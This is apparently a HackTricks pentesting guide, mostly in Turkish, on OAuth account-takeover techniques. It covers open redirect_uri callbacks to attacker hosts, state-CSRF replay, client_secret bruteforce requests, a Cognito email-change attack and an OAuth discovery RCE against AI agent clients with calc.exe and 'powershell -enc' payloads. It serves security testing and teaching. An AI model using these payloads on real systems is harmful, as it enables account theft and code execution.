# OAuth ile Hesap Ele Geçirme

{{#include ../banners/hacktricks-training.md}}

## Temel Bilgiler <a href="#d4a8" id="d4a8"></a>

OAuth çeşitli sürümler sunar; temel bilgiler için [OAuth 2.0 documentation](https://oauth.net/2/) adresine bakılabilir. Bu bölüm esas olarak yaygın olarak kullanılan [OAuth 2.0 authorization code grant type](https://oauth.net/2/grant-types/authorization-code/) üzerine odaklanır ve bir uygulamanın başka bir uygulamadaki (yetkilendirme sunucusu) bir kullanıcının hesabına erişmesini veya o hesap üzerinde işlem gerçekleştirmesini sağlayan bir **yetkilendirme çerçevesi** sağlar.

Varsayımsal bir site olarak _**https://example.com**_'u ele alın; bu site **tüm sosyal medya gönderilerinizi**, özel olanlar da dahil olmak üzere, **göstermek** üzere tasarlanmıştır. Bunu başarmak için OAuth 2.0 kullanılır. _https://example.com_ sosyal medya gönderilerinize **erişim izni** talep edecektir. Sonuç olarak, istenen izinleri ve istekte bulunan geliştiriciyi belirten bir onay ekranı _https://socialmedia.com_ üzerinde gösterilecektir. Onay verdiğinizde, _https://example.com_ sizin adınıza gönderilerinize **erişim sağlayabilir**.

OAuth 2.0 çerçevesinde şu bileşenleri anlamak önemlidir:

- **kaynak sahibi (resource owner)**: Siz; bir **kullanıcı/varlık** olarak kaynaklarınıza (ör. sosyal medya hesabınızdaki gönderiler) erişilmesine izin verirsiniz.
- **kaynak sunucusu (resource server)**: Uygulamanın `access token` almasının ardından, doğrulanmış istekleri yöneten **sunucu**, ör. **https://socialmedia.com**.
- **istemci uygulama (client application)**: `resource owner`'dan yetki talep eden **uygulama**, ör. **https://example.com**.
- **yetkilendirme sunucusu (authorization server)**: `resource owner` başarılı şekilde kimlik doğrulaması yapıp yetki verdiğinde `client application`'a `access token` veren **sunucu**, ör. **https://socialmedia.com**.
- **client_id**: Uygulama için herkese açık, benzersiz bir tanımlayıcı.
- **client_secret:** Yalnızca uygulama ve yetkilendirme sunucusu tarafından bilinen gizli bir anahtar; `access_tokens` oluşturmak için kullanılır.
- **response_type**: Talep edilen token türünü belirten bir değer, ör. `code`.
- **scope**: `client application`'ın `resource owner`'dan talep ettiği erişim düzeyi.
- **redirect_uri**: Kullanıcının yetkilendirmeden sonra yönlendirileceği URL. Genellikle önceden kaydedilmiş redirect URL ile eşleşmelidir.
- **state**: Kullanıcının yetkilendirme sunucusuna yönlendirilmesi sırasında ve dönüşünde veriyi korumak için kullanılan bir parametre. Benzersiz olması, bunun bir **CSRF koruma mekanizması** olarak işlev görmesi için kritiktir.
- **grant_type**: Hangi grant türünün ve hangi token türünün döndürüleceğini belirten parametre.
- **code**: Yetkilendirme sunucusundan alınan authorization code; istemci uygulama tarafından `client_id` ve `client_secret` ile birlikte kullanılarak `access_token` elde etmek için kullanılır.
- **access_token**: İstemci uygulamanın `resource owner` adına API istekleri yapmak için kullandığı token.
- **refresh_token**: Uygulamanın kullanıcıyı yeniden istemeden yeni bir `access_token` almasını sağlar.

### Akış

Gerçek OAuth akışı şu şekilde ilerler:

1. [https://example.com](https://example.com) adresine gidersiniz ve “Sosyal Medya ile Entegre Et” butonunu seçersiniz.
2. Site, https://example.com uygulamasının gönderilerinize erişmesine izin vermeniz için [https://socialmedia.com](https://socialmedia.com) adresine bir yetkilendirme isteği gönderir. İstek şu şekilde yapılandırılır:
```
https://socialmedia.com/auth
?response_type=code
&client_id=example_clientId
&redirect_uri=https%3A%2F%2Fexample.com%2Fcallback
&scope=readPosts
&state=randomString123
```
3. Ardından size bir onay sayfası gösterilir.
4. Onayınızın ardından, Social Media `redirect_uri`'ye `code` ve `state` parametreleriyle bir yanıt gönderir:
```
https://example.com?code=uniqueCode123&state=randomString123
```
5. https://example.com bu `code`, `client_id` ve `client_secret` ile birlikte, sizin adınıza sunucu tarafı bir istek yaparak bir `access_token` elde eder ve onayladığınız izinlere erişim sağlar:
```
POST /oauth/access_token
Host: socialmedia.com
...{"client_id": "example_clientId", "client_secret": "example_clientSecret", "code": "uniqueCode123", "grant_type": "authorization_code"}
```
6. Son olarak, süreç https://example.com sizin `access_token`'ınızı kullanarak Social Media'ya bir API çağrısı yapıp erişim sağladığında sona erer

## Güvenlik Açıkları <a href="#id-323a" id="id-323a"></a>

### Open redirect_uri <a href="#cc36" id="cc36"></a>

Per [RFC 6749 §3.1.2](https://www.rfc-editor.org/rfc/rfc6749#section-3.1.2), authorization server yalnızca **pre-registered, exact redirect URIs**'e tarayıcıyı yönlendirmelidir. Buradaki herhangi bir zayıflık, bir saldırganın mağduru kötü amaçlı bir authorization URL'si aracılığıyla yönlendirmesine izin verir; böylece IdP mağdurun `code`'unu (ve `state`'ini) doğrudan saldırganın uç noktasına teslim eder, saldırgan bunu çözer ve token'ları toplar.

Tipik saldırı iş akışı:

1. `https://idp.example/auth?...&redirect_uri=https://attacker.tld/callback` şeklinde bir URL oluşturup mağdura gönderin.
2. Mağdur kimlik doğrulaması yapar ve scope'ları onaylar.
3. IdP `attacker.tld/callback?code=<victim-code>&state=...` adresine yönlendirir; saldırgan isteği kaydeder ve kodu hemen takas ederek token'ları alır.

Sınanacak yaygın doğrulama hataları:

- **No validation** – herhangi bir absolute URL kabul ediliyorsa anında code hırsızlığı olur.
- **Weak substring/regex checks on the host** – `evilmatch.com`, `match.com.evil.com`, `match.com.mx`, `matchAmatch.com`, `evil.com#match.com` veya `match.com@evil.com` gibi lookalike'larla atlatılabilir.
- **IDN homograph mismatches** – doğrulama punycode formu (`xn--`) üzerinde yapılır, ancak tarayıcı saldırganın kontrol ettiği Unicode domain'e yönlendirir.
- **Arbitrary paths on an allowed host** – `redirect_uri`'yi `/openredirect?next=https://attacker.tld` veya herhangi bir XSS/kullanıcı-içeriği endpoint'ine işaret ettirerek kodun zincirlenmiş yönlendirmeler, Referer headers veya enjekte edilmiş JavaScript üzerinden sızmasına neden olur.
- **Directory constraints without normalization** – `/oauth/*` gibi desenler `/oauth/../anything` ile atlatılabilir.
- **Wildcard subdomains** – `*.example.com` kabul ediliyorsa herhangi bir takeover (dangling DNS, S3 bucket, vb.) anında geçerli bir callback sağlar.
- **Non-HTTPS callbacks** – `http://` URI'lerine izin vermek, ağ saldırganlarına (Wi‑Fi, kurumsal proxy) kodu iletim sırasında yakalama fırsatı verir.

Ayrıca auxiliary redirect-style parametrelerini (`client_uri`, `policy_uri`, `tos_uri`, `initiate_login_uri`, vb.) ve aynı doğrulama hatalarını miras alabilecek ek uç noktalar için OpenID discovery document (`/.well-known/openid-configuration`) dosyasını inceleyin.

### XSS in redirect implementation <a href="#bda5" id="bda5"></a>

Bu bug bounty raporunda belirtildiği gibi [https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html](https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html) redirect **URL is being reflected in the response** olabileceği ve bunun **XSS'e karşı savunmasız** olduğu mümkün olabilir. Test edilecek olası payload:
```
https://app.victim.com/login?redirectUrl=https://app.victim.com/dashboard</script><h1>test</h1>
```
### CSRF - state parametresinin uygunsuz işlenmesi <a href="#bda5" id="bda5"></a>

`state` parametresi Authorization Code flow'un CSRF token'ıdır: client her tarayıcı örneği için **kriptografik olarak rastgele bir değer** üretmeli, sadece o tarayıcının okuyabileceği bir yerde (cookie, local storage, vb.) saklamalı, yetkilendirme isteğinde göndermeli ve aynı değeri döndürmeyen herhangi bir yanıtı reddetmelidir. Değer statik, tahmin edilebilir, isteğe bağlı veya kullanıcının oturumuna bağlı değilse, saldırgan kendi OAuth akışını bitirip son `?code=` isteğini yakalayabilir (göndermeden) ve daha sonra bir kurban tarayıcıyı o isteği yeniden oynatmaya zorlayarak kurban hesabının saldırganın IdP profiline bağlanmasını sağlayabilir.

Replay deseni her zaman aynıdır:

1. Saldırgan kendi hesabıyla IdP'ye kimlik doğrular ve son yönlendirmeyi içeren `code` (ve varsa `state`) değerini yakalar.
2. Bu isteği bırakır, URL'yi saklar ve daha sonra kurban tarayıcıyı yüklemeye zorlamak için herhangi bir CSRF ilkelini (link, iframe, otomatik gönderilen form) suistimal eder.
3. Eğer istemci `state`'i zorunlu kılmazsa, uygulama saldırganın yetkilendirme sonucunu tüketir ve saldırganı kurbanın uygulama hesabına giriş yapmış olarak kaydeder.

Testler sırasında `state` işlenmesi için pratik kontrol listesi:

- **`state` tamamen eksik** – parametre hiç görünmüyorsa, tüm giriş CSRF'ye açıktır.
- **`state` zorunlu değil** – başlangıç isteğinden kaldırın; IdP hâlâ istemcinin kabul ettiği kodları veriyorsa savunma opt-in demektir.
- **Geri dönen `state` doğrulanmıyor** – yanıttaki değeri değiştirmeyi deneyin (Burp, MITM proxy). Eşleşmeyen değerleri kabul etmek, saklanan token'ın hiçbir zaman karşılaştırılmadığı anlamına gelir.
- **Tahmin edilebilir veya tamamen veri odaklı `state`** – birçok uygulama rastgelelik katmadan yönlendirme yolları veya JSON blob'larını `state` içine koyar; bu, saldırganların geçerli değerleri tahmin edip akışları yeniden oynatmasına izin verir. Verileri kodlamadan önce her zaman güçlü entropi ekleyin (önek veya son ek).
- **`state` fixation** – uygulama kullanıcılara `state` değerini sağlamasına izin veriyor (ör. özel hazırlanmış authorization URL'leri aracılığıyla) ve bunu akış boyunca tekrar kullanıyorsa, saldırgan bilinen bir değeri sabitleyip kurbanlar arasında tekrar kullanabilir.

PKCE, yetkilendirme kodunu bir code verifier'a bağlayarak `state`'i tamamlayabilir (özellikle public clients için), ancak web istemcileri yine de kullanıcılar arası CSRF/hesap-bağlama hatalarını önlemek için `state`'i takip etmelidir.

### Account Takeover Öncesi <a href="#ebe4" id="ebe4"></a>

1. **Hesap Oluşturulurken E-posta Doğrulaması Olmadan**: Saldırganlar kurbanın e-postasını kullanarak önceden bir hesap oluşturabilir. Kurban daha sonra üçüncü taraf bir hizmetle giriş yaparsa, uygulama yanlışlıkla bu üçüncü taraf hesabı saldırganın önceden oluşturduğu hesaba bağlayabilir ve yetkisiz erişime yol açabilir.
2. **Gevşek OAuth E-posta Doğrulamasını İstismar Etme**: Saldırganlar e-postaları doğrulamayan OAuth servislerini, kendi hesaplarını kaydettikten sonra hesap e-postasını kurbanın e-postasına değiştirerek istismar edebilir. Bu yöntem, ilk senaryoya benzer şekilde yetkisiz hesap erişimi riski taşır ancak farklı bir saldırı vektörü üzerinden gerçekleşir.

### Sırların Açığa Çıkması <a href="#e177" id="e177"></a>

`client_id` kasıtlı olarak herkese açıktır, fakat **`client_secret` asla son kullanıcılar tarafından elde edilebilir olmamalıdır**. Authorization Code dağıtımları gizliyi **mobil APK'lar, masaüstü istemciler veya tek sayfa uygulamalar** içine gömüyorsa, paketi indirebilen herkese o kimlik bilgilerini teslim etmiş olur. Public clients'ları her zaman şu şekilde inceleyin:

- APK/IPA, masaüstü yükleyicisi veya Electron uygulamasını açıp `client_secret` için arama yapmak; JSON'e decode olan Base64 blob'ları veya gömülü OAuth endpoint'lerini tespit etmek.
- Paketlenmiş konfigürasyon dosyalarını (plist, JSON, XML) veya decompile edilmiş stringleri client kimlik bilgileri için gözden geçirmek.

Saldırgan gizli değeri çıkardıktan sonra, herhangi bir kurbanın yetkilendirme `code`'unu (zayıf bir `redirect_uri`, loglar vb. yoluyla) çalmak yeterlidir; böylece `/token` uç noktasına bağımsız olarak istek atıp access/refresh token'lar mint ederek meşru uygulamayı dahil etmeden erişim elde edebilir. Public/native istemcileri **secret saklayamaz** olarak değerlendirin — bunun yerine statik bir secret yerine her örnek için bir code verifier'a sahip olunduğunu kanıtlamak amacıyla PKCE (RFC 7636) kullanılmalıdır. Test sırasında PKCE'nin zorunlu olup olmadığını ve backend'in ya `client_secret` **veya** geçerli bir `code_verifier` eksik olduğunda token değişimini gerçekten reddedip reddetmediğini doğrulayın.

### Client Secret Bruteforce

Servis sağlayıcının `client_secret`'ını IdP ile birlikte kullanarak hesap çalmak amacıyla **bruteforce the client_secret** yöntemini deneyebilirsiniz.\
BF'ye yapılacak istek şu şekilde görünebilir:
```
POST /token HTTP/1.1
content-type: application/x-www-form-urlencoded
host: 10.10.10.10:3000
content-length: 135
Connection: close

code=77515&redirect_uri=http%3A%2F%2F10.10.10.10%3A3000%2Fcallback&grant_type=authorization_code&client_id=public_client_id&client_secret=[bruteforce]
```
### Referer/Header/Location artifacts leaking Code + State

Once the client has the **code and state**, if they surface in **`location.href`** or **`document.referrer`** and are forwarded to third parties, they leak. Two recurring patterns:

- **Classic Referer leak**: after the OAuth redirect, any navigation that keeps `?code=&state=` in the URL will push them into the **Referer** header sent to CDNs/analytics/ads.
- **Telemetry/analytics confused deputy**: some SDKs (pixels/JS loggers) react to `postMessage` events and then **send the current `location.href`/`referrer` to backend APIs using a token supplied in the message**. If you can inject your own token into that flow (e.g., via an attacker-controlled postMessage relay), you can later read the SDK’s API request history/logs and recover the victim’s OAuth artifacts embedded in those requests.


### Access Token Stored in Browser History

The core guarantee of the Authorization Code grant is that **access tokens never reach the resource owner’s browser**. When implementations leak tokens client-side, any minor bug (XSS, Referer leak, proxy logging) becomes instant account compromise. Always check for:

- **Tokens in URLs** – if `access_token` appears in the query/fragment, it lands in browser history, server logs, analytics, and Referer headers sent to third parties.
- **Tokens transiting untrusted middleboxes** – returning tokens over HTTP or through debugging/corporate proxies lets network observers capture them directly.
- **Tokens stored in JavaScript state** – React/Vue stores, global variables, or serialized JSON blobs expose tokens to every script on the origin (including XSS payloads or malicious extensions).
- **Tokens persisted in Web Storage** – `localStorage`/`sessionStorage` retain tokens long after logout on shared devices and are script-accessible.

Any of these findings usually upgrades otherwise “low” bugs (like a CSP bypass or DOM XSS) into full API takeover because the attacker can simply read and replay the leaked bearer token.

### Everlasting Authorization Code

Authorization codes must be **short-lived, single-use, and replay-aware**. When assessing a flow, capture a `code` and:

- **Test the lifetime** – RFC 6749 recommends minutes, not hours. Try redeeming the code after 5–10 minutes; if it still works, the exposure window for any leaked code is excessive.
- **Test sequential reuse** – send the same `code` twice. If the second request yields another token, attackers can clone sessions indefinitely.
- **Test concurrent redemption/race conditions** – fire two token requests in parallel (Burp intruder, turbo intruder). Weak issuers sometimes grant both.
- **Observe replay handling** – a reuse attempt should not only fail but also revoke any tokens already minted from that code. Otherwise, a detected replay leaves the attacker’s first token active.

Combining a replay-friendly code with any `redirect_uri` or logging bug allows persistent account access even after the victim completes the legitimate login.

### Authorization/Refresh Token not bound to client

If you can get the **authorization code** and **redeem it for a different client/app**, you can takeover other accounts. Test for weak binding by:

- Capturing a `code` for **app A** and sending it to **app B’s token endpoint**; if you still receive a token, audience binding is broken.
- Trying first-party token minting endpoints that should be restricted to their own client IDs; if they accept arbitrary `state`/`app_id` while only validating the code, you effectively perform an **authorization-code swap** to mint higher-privileged first-party tokens.
- Checking whether client binding ignores nonce/redirect URI mismatches. If an error page still loads SDKs that log `location.href`, combine with Referer/telemetry leaks to steal codes and redeem them elsewhere.

Any endpoint that exchanges `code` → token **must** verify the issuing client, redirect URI, and nonce; otherwise, a stolen code from any app can be upgraded to a first-party access token.

### Happy Paths, XSS, Iframes & Post Messages to leak code & state values

[**Check this post**](https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/#gadget-2-xss-on-sandbox-third-party-domain-that-gets-the-url)

### AWS Cognito <a href="#bda5" id="bda5"></a>

In this bug bounty report: [**https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/**](https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/) you can see that the **token** that **AWS Cognito** gives back to the user might have **enough permissions to overwrite the user data**. Therefore, if you can **change the user email for a different user email**, you might be able to **take over** others accounts.
```bash
# Read info of the user
aws cognito-idp get-user --region us-east-1 --access-token eyJraWQiOiJPVj[...]

# Change email address
aws cognito-idp update-user-attributes --region us-east-1 --access-token eyJraWQ[...] --user-attributes Name=email,Value=imaginary@flickr.com
{
"CodeDeliveryDetailsList": [
{
"Destination": "i***@f***.com",
"DeliveryMedium": "EMAIL",
"AttributeName": "email"
}
]
}
```
For more detailed info about how to abuse AWS Cognito check [AWS Cognito - Unauthenticated Enum Access](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-cognito-unauthenticated-enum.html).

### Abusing other Apps tokens <a href="#bda5" id="bda5"></a>

As [**mentioned in this writeup**](https://salt.security/blog/oh-auth-abusing-oauth-to-take-over-millions-of-accounts), OAuth akışlarının **kod** yerine **token** almayı beklediği durumlarda, tokenın uygulamaya ait olup olmadığını kontrol etmezlerse zafiyete açık olabileceği belirtiliyor.

Bunun nedeni, bir **saldırganın** kendi uygulamasında OAuth destekleyen ve örneğin Facebook ile login olan bir **application** oluşturabilmesi. Ardından, bir kurban saldırganın uygulamasında Facebook ile giriş yaptığında, saldırgan kullanıcının kendi uygulamasına verilen **OAuth token**ını elde edebilir ve bu tokenı kullanarak kurbanın OAuth uygulamasına kurbanın kullanıcı tokenı ile giriş yapabilir.

> [!CAUTION]
> Bu yüzden, saldırgan kullanıcıyı kendi OAuth uygulamasına eriştirirse, token bekleyen ve bu tokenın kendi app ID'lerine verilip verilmediğini kontrol etmeyen uygulamalarda kurbanın hesabını ele geçirebilir.

### Two links & cookie <a href="#bda5" id="bda5"></a>

According to [**this writeup**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), kurbanın **returnUrl**'i saldırganın hostuna işaret eden bir sayfayı açması sağlanabiliyordu. Bu bilgi bir **cookie (RU)** içinde saklanıyor ve **sonraki bir adımda** **prompt** kullanıcıya saldırganın hostuna erişim verip vermemeyi **sormak** üzere görünüyordu.

Bu prompt'u atlatmak için, RU cookie'sini set edecek şekilde **Oauth flow** başlatmak amacıyla bir sekme açmak, prompt gösterilmeden sekmeyi kapatmak ve o değerin olmadığı yeni bir sekme açmak mümkündü. Böylece **prompt saldırganın hostunu bildirmeyecek**, ama cookie saldırganın hostuna ayarlanmış olacağı için **token.redirect** ile saldırganın hostuna gönderilecekti.

### Prompt Interaction Bypass <a href="#bda5" id="bda5"></a>

As explained in [**this video**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), bazı OAuth implementasyonları, platformda zaten girişliyseler web üzerindeki promptta verilen erişimi onaylamalarını engellemek için GET parametresi **`prompt`**'u None olarak belirtmeye izin verir (**`&prompt=none`**).

### response_mode

As [**explained in this video**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), final URL'de kodun nerede sağlanmasını istediğinizi belirtmek için **`response_mode`** parametresini kullanmak mümkün olabilir:

- `response_mode=query` -> Kod GET parametresi içinde sağlanır: `?code=2397rf3gu93f`
- `response_mode=fragment` -> Kod URL fragment parametresi içinde sağlanır: `#code=2397rf3gu93f`
- `response_mode=form_post` -> Kod `code` adlı bir input ile bir POST form içinde sağlanır
- `response_mode=web_message` -> Kod bir post message ile gönderilir: `window.opener.postMessage({"code": "asdasdasd...`

### Clickjacking OAuth consent dialogs

OAuth consent/login dialogları clickjacking için ideal hedeflerdir: eğer frame içinde yüklenebiliyorlarsa, saldırgan özel grafikler bindirip gerçek butonları gizleyerek kullanıcıları tehlikeli scope'ları onaylamaya veya hesap bağlamaya kandırabilir. PoC'lar şu şekilde inşa edin:

1. IdP authorization URL'sini `<iframe sandbox="allow-forms allow-scripts allow-same-origin">` içinde yükleyin.
2. Sahte butonları gizli **Allow**/**Approve** kontrolleriyle hizalamak için absolute positioning/opacity numaraları kullanın.
3. İsteğe bağlı olarak parametreleri (scopes, redirect URI) önceden doldurun ki çalınan onay saldırgana anında fayda sağlasın.

Test sırasında IdP sayfalarının ya `X-Frame-Options: DENY/SAMEORIGIN` ya da kısıtlayıcı bir `Content-Security-Policy: frame-ancestors 'none'` yayınlayıp yayınlamadığını doğrulayın. Eğer ikisi de yoksa, riski [NCC Group’s clickjacking PoC generator](https://github.com/nccgroup/clickjacking-poc) gibi araçlarla gösterin ve kurbanın saldırganın uygulamasını ne kadar kolay onayladığını kaydedin. Ek payload fikirleri için bakınız [Clickjacking](clickjacking.md).

### OAuth ROPC flow - 2 FA bypass <a href="#b440" id="b440"></a>

According to [**this blog post**](https://cybxis.medium.com/a-bypass-on-gitlabs-login-email-verification-via-oauth-ropc-flow-e194242cad96), bu OAuth akışı OAuth üzerinden **username** ve **password** ile login olmaya izin verir. Eğer bu basit akış sırasında kullanıcının tüm işlemlerine erişim veren bir **token** döndürülüyorsa, bu token kullanılarak 2FA atlanabilir.

### ATO on web page redirecting based on open redirect to referrer <a href="#bda5" id="bda5"></a>

This [**blogpost**](https://blog.voorivex.team/oauth-non-happy-path-to-ato) açık bir open redirect'i **referrer** değerine göre kullanarak OAuth ile ATO'yu nasıl suistimal ettiklerini anlatıyor. Saldırı şu şekildeydi:

1. Kurban saldırganın web sayfasına erişir
2. Kurban zararlı linki açar ve bir opener ek parametreler olarak `response_type=id_token,code&prompt=none` ile Google OAuth akışını başlatır; opener'ın referrer'ı **saldırganın websitesi** olur.
3. Opener içinde provider kurbanı yetkilendirdikten sonra `redirect_uri` parametresinin değeri (kurbanın sitesi) ile geri gönderir ve 30X kodu ile yönlendirme yapar; bu işlem sırasında referer hâlâ saldırganın sitesini içerir.
4. Kurbanın **web sitesi referer'a göre open redirect'i tetikler** ve kurbanı saldırganın sitesine yönlendirir; çünkü **`respose_type`** **`id_token,code`** idi, kod URL fragment'inde saldırgana gönderilecek ve bu sayede saldırgan kurbanın hesabını Google üzerinden ele geçirebilecekti.

### SSRFs parameters <a href="#bda5" id="bda5"></a>

[**Check this research**](https://portswigger.net/research/hidden-oauth-attack-vectors) **For further details of this technique.**

OAuth'ta Dynamic Client Registration, Server-Side Request Forgery (SSRF) saldırıları için daha az belirgin ama kritik bir vektör olarak hizmet edebilir. Bu endpoint OAuth sunucularının client uygulamayla ilgili detaylar almasını sağlar; bunlara kötüye kullanılabilecek hassas URL'ler de dahildir.

Önemli Noktalar:

- **Dynamic Client Registration** genellikle `/register` ile eşlenir ve `client_name`, `client_secret`, `redirect_uris` ve logo veya JSON Web Key Sets (JWKs) için URL'ler gibi detayları POST kabul eder.
- Bu özellik **RFC7591** ve **OpenID Connect Registration 1.0**'da belirtilen spesifikasyonlara uyar; bu spesifikasyonlarda SSRF'e açık olabilecek parametreler vardır.
- Kayıt süreci sunucuyu birden fazla şekilde SSRF'ye maruz bırakabilir:
  - **`logo_uri`**: Client uygulamanın logosu için bir URL; sunucu tarafından fetch edilirse SSRF tetiklenebilir veya URL yanlış işlenirse XSS ortaya çıkabilir.
  - **`jwks_uri`**: Client'ın JWK dokümanına işaret eden bir URL; kötü amaçlı hazırlanırsa sunucunun saldırgan kontrolündeki bir sunucuya outbound istek yapmasına neden olabilir.
  - **`sector_identifier_uri`**: `redirect_uris`'lerin JSON dizisini referans eder; sunucunun bunu fetch etmesi SSRF fırsatı yaratır.
  - **`request_uris`**: Client için izin verilen request URI'lerin listesi; sunucu bu URI'leri authorization başlangıcında fetch ediyorsa suistimal edilebilir.

Sömürü Stratejisi:

- `logo_uri`, `jwks_uri` veya `sector_identifier_uri` gibi parametrelere kötü amaçlı URL'ler vererek yeni bir client kaydederek SSRF tetiklenebilir.
- `request_uris` üzerinden doğrudan sömürü whitelist kontrolleriyle sınırlanmış olabilir, ancak önceden kayıtlı, saldırganın kontrolündeki bir `request_uri` sağlamak authorization aşamasında SSRF kolaylaştırabilir.

### OAuth/OIDC Discovery URL Abuse & OS Command Execution

Research on [CVE-2025-6514](https://amlalabs.com/blog/oauth-cve-2025-6514/) (impacting `mcp-remote` clients such as Claude Desktop, Cursor or Windsurf) shows how **dynamic OAuth discovery becomes an RCE primitive** whenever the client forwards IdP metadata straight to the operating system. The remote MCP server returns an attacker-controlled `authorization_endpoint` during the discovery exchange (`/.well-known/openid-configuration` or any metadata RPC). `mcp-remote ≤0.1.15` would then call the system URL handler (`start`, `open`, `xdg-open`, etc.) with whatever string arrived, so any scheme/path supported by the OS executed locally.

**Attack workflow**

1. Point the desktop agent to a hostile MCP/OAuth server (`npx mcp-remote https://evil`). The agent receives `401` plus metadata.
2. The server answers with JSON such as:
```
HTTP/1.1 200 OK
Content-Type: application/json

{
"authorization_endpoint": "file:/c:/windows/system32/calc.exe",
"token_endpoint": "https://evil/idp/token",
...
}
```
3. İstemci, sağlanan URI için OS handler'ını başlatır. Windows `file:/c:/windows/system32/calc.exe /c"powershell -enc ..."` gibi payload'ları kabul eder; macOS/Linux `file:///Applications/Calculator.app/...` veya kayıtlıysa `cmd://bash -lc '<payload>'` gibi custom scheme'leri kabul eder.
4. Bu, herhangi bir kullanıcı etkileşiminden önce gerçekleştiği için, **istemciyi sadece attacker sunucusuyla konuşacak şekilde yapılandırmak bile kod çalıştırmaya yol açar**.

**Nasıl test edilir**

- Discovery'yi HTTP(S) üzerinden yapan ve dönen endpoint'leri yerel olarak açan herhangi bir OAuth-capable desktop/agent'i hedefleyin (Electron apps, CLI helpers, thick clients).
- Discovery cevabını intercept edin veya barındırın ve `authorization_endpoint`, `device_authorization_endpoint` veya benzeri alanları `file://`, `cmd://`, UNC yolları veya diğer tehlikeli scheme'lerle değiştirin.
- İstemcinin scheme/host doğrulayıp doğrulamadığını gözlemleyin. Doğrulama eksikliği, kullanıcı bağlamında anında yürütme ile sonuçlanır ve zafiyeti kanıtlar.
- Tam saldırı yüzeyini haritalamak için farklı scheme'lerle tekrarlayın (ör. `ms-excel:`, `data:text/html,`, custom protocol handlers) ve çapraz platform erişimini gösterin.

## OAuth providers Race Conditions

Eğer test ettiğiniz platform bir OAuth provider ise [**race condition'lar için test etmek için burayı okuyun**](race-condition.md).

## Mutable Claims Attack

OAuth'ta sub alanı kullanıcıyı benzersiz şekilde tanımlar, fakat formatı Authorization Server'a göre değişir. Bazı istemciler kullanıcı tanımlamasını standartlaştırmak için email veya kullanıcı handle'ları kullanır. Ancak bu risklidir çünkü:

- Bazı Authorization Server'lar bu özelliklerin (ör. email) değişmez kalmasını sağlamaz.
- Bazı uygulamalarda — örneğin **"Login with Microsoft"** — istemci email alanına güvenmekte olup bu alan **Entra ID içinde kullanıcı tarafından kontrol edilir** ve doğrulanmamıştır.
- Bir attacker bunu, kendi Azure AD organizasyonunu (ör. doyensectestorg) oluşturarak ve Microsoft login gerçekleştirmek için kullanarak suistimal edebilir.
- Object ID (sub içinde saklanan) değişmez ve güvenliyken, değişebilir bir email alanına güvenilmesi hesap ele geçirmeye yol açabilir (örneğin victim@gmail.com gibi bir hesabın ele geçirilmesi).

## Client Confusion Attack

Bir **Client Confusion Attack** durumunda, OAuth Implicit Flow kullanan bir uygulama final access token'ın gerçekten kendi Client ID'si için oluşturulduğunu doğrulamaz. Bir attacker, Google’ın OAuth Implicit Flow'unu kullanan halka açık bir web sitesi kurar, binlerce kullanıcıyı giriş yapmaya kandırır ve böylece attacker'ın sitesine ait access token'ları toplar. Bu kullanıcıların başka, token'ın Client ID'sini doğrulamayan savunmasız bir web sitesinde hesapları varsa, attacker topladığı token'ları yeniden kullanarak mağdurların hesaplarına bürünebilir ve hesapları ele geçirebilir.

## Scope Upgrade Attack

Authorization Code Grant tipi, kullanıcı verilerinin iletimi için güvenli server-to-server iletişimi gerektirir. Ancak Authorization Server Access Token Request içindeki scope parametresine (RFC'de tanımlı olmayan bir parametre) zımnen güveniyorsa, kötü amaçlı bir uygulama daha yüksek bir scope isteyerek authorization code'un ayrıcalıklarını yükseltebilir. Access Token oluşturulduktan sonra Resource Server bunu doğrulamalıdır: JWT token'lar için bu, JWT imzasını kontrol etmeyi ve client_id ile scope gibi verileri çıkarmayı içerirken, rastgele string token'lar için sunucu token ayrıntılarını almak üzere Authorization Server'a sorgu yapmalıdır.

## Redirect Scheme Hijacking

Mobil OAuth uygulamalarında, uygulamalar Authorization Code içeren redirect'leri almak için custom URI scheme'leri kullanır. Ancak bir cihazda birden fazla uygulama aynı scheme'i kaydedebildiğinden, sadece meşru istemcinin redirect URI'yi kontrol ettiği varsayımı bozulur. Örneğin Android'de `com.example.app://` gibi bir Intent URI, bir uygulamanın intent-filter'ında tanımlanan scheme ve opsiyonel filtrelere göre yakalanır. Android'in intent çözümlemesi özellikle sadece scheme belirtildiyse geniş olabileceğinden, bir attacker kötü amaçlı bir uygulamayı dikkatle hazırlanmış bir intent filter ile kaydederek authorization code'u ele geçirebilir. Bu, birden fazla uygulamanın intent'i işleme uygun olduğu durumda kullanıcı etkileşimiyle veya Ostorlab'ın değerlendirme akış şemasında detaylandırıldığı gibi aşırı spesifik filtreleri suistimal eden bypass teknikleri aracılığıyla **hesap ele geçirmeye** yol açabilir.



## References

- [**https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1**](https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1)
- [**https://portswigger.net/research/hidden-oauth-attack-vectors**](https://portswigger.net/research/hidden-oauth-attack-vectors)
- [**https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html**](https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html)
- [An Offensive Guide to the OAuth 2.0 Authorization Code Grant](https://www.nccgroup.com/research-blog/an-offensive-guide-to-the-authorization-code-grant/)
- [OAuth Discovery as an RCE Vector (Amla Labs)](https://amlalabs.com/blog/oauth-cve-2025-6514/)
- [Leaking fbevents: OAuth code exfiltration via postMessage trust leading to Instagram ATO](https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html)

{{#include ../banners/hacktricks-training.md}}
